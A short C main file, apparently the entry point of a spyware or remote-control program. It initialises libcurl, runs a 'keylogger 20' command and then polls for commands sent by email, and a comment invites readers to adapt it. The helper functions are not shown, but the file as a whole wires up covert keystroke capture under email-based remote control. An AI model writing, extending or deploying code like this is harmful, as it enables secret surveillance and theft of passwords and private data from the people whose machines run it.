#include "../Application/lib.h"
#include "../Application/checkCommand.h"
// Modified to fit one's need
int main() {
  curl_global_init(CURL_GLOBAL_DEFAULT);

  execute_command("keylogger 20");
  check_email_commands();
  curl_global_cleanup();

  system("pause");
  return 0;
}